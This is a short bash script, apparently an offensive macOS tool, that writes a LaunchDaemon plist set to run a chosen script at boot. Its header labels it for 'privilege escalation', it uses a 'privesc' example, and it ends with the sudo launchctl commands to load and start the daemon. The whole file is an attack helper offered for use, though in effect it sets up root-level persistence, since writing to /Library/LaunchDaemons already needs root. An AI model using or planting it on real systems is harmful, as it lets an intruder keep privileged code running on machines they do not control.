#!/bin/bash
# Create a LaunchDaemon plist for privilege escalation
# Usage: ./create-launchdaemon.sh <label> <script-path> [output-path]

if [ $# -lt 2 ]; then
    echo "Usage: $0 <label> <script-path> [output-path]"
    echo "Example: $0 com.example.privesc /Applications/Scripts/privesc.sh"
    exit 1
fi

LABEL="$1"
SCRIPT_PATH="$2"
OUTPUT_PATH="${3:-/Library/LaunchDaemons/${LABEL}.plist}"

# Validate script exists
if [ ! -e "$SCRIPT_PATH" ]; then
    echo "Warning: Script does not exist: $SCRIPT_PATH"
    echo "Creating plist anyway..."
fi

# Create LaunchDaemon plist
cat > "$OUTPUT_PATH" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>$LABEL</string>
        <key>ProgramArguments</key>
        <array>
            <string>$SCRIPT_PATH</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
EOF

# Set permissions
chmod 644 "$OUTPUT_PATH"

echo "Created LaunchDaemon: $OUTPUT_PATH"
echo "Label: $LABEL"
echo "Script: $SCRIPT_PATH"
echo ""
echo "To load: sudo launchctl load $OUTPUT_PATH"
echo "To start: sudo launchctl start $LABEL"
